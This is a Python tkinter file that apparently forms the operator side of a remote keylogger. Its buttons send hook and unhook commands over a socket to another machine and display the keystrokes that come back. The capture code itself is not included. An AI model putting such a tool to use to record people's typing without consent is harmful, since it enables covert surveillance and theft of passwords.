# keylog.py
import tkinter as tk
def key_stroke(self, client):
    logger = ''
    Stroke = tk.Tk()
    Stroke.title("Keystroke")  
    Stroke.geometry("420x420")
    Stroke.configure(bg = 'white')
    frame = tk.Frame(Stroke, bg = "#FFEFDB", padx=20, pady = 20, borderwidth=5)
    frame.grid(row=1,column=0)
    tab = tk.Text(Stroke, width = 50, heigh = 15)
    tab.grid(row = 1, column = 0, columnspan= 4)
    PrsHook = False
    PrsUnhook = False
    #hook receive
    def ReceiveHook(client):
        data = client.recv(1024).decode("utf-8")
        string = data
        client.sendall(bytes(data,"utf-8"))  
        return string
    #hook function
    def Hookkey():
        nonlocal PrsHook, PrsUnhook
        if PrsHook == True: return
        PrsHook = True
        PrsUnhook = False
        client.sendall(bytes("HookKey","utf-8"))
        checkdata = client.recv(1024).decode("utf-8")
    #unhook function
    def Unhookkey():
        nonlocal logger, PrsUnhook, PrsHook
        if PrsHook == True:
            client.sendall(bytes("UnhookKey","utf-8"))    
            logger = ReceiveHook(client)
            client.sendall(bytes(logger,"utf-8")) 
            PrsUnhook = True
            PrsHook = False
    #print keylog
    def Print():
        nonlocal logger, PrsUnhook, PrsHook
        if PrsUnhook == False: 
            client.sendall(bytes("UnhookKey","utf-8"))
            logger = ReceiveHook(client)
        tab.delete(1.0, tk.END)
        tab.insert(1.0, logger)
        PrsUnhook = True
        PrsHook = False
    #delete keylog
    def Deletekey():
        tab.delete(1.0,tk.END)
                    
    hook = tk.Button(Stroke, text = "Hook", font = "Helvetica 9 bold",bg = "#FFDEAD", padx = 25, pady = 20, command = Hookkey).grid(row = 2,column = 0)
    unhook = tk.Button(Stroke, text = "Unhook",font = "Helvetica 9 bold", bg = "#EECFA1", padx = 25, pady = 20, command = Unhookkey).grid(row = 2,column = 1) 
    prs = tk.Button(Stroke, text = "InsertKeys",font = "Helvetica 9 bold",bg = "#CDB38B", padx = 25, pady = 20,command = Print).grid(row = 2,column = 2)
    delete = tk.Button(Stroke, text = "Delete", font = "Helvetica 9 bold", bg = "#8B795E",padx = 25, pady = 20,command = Deletekey).grid(row = 2,column = 3)
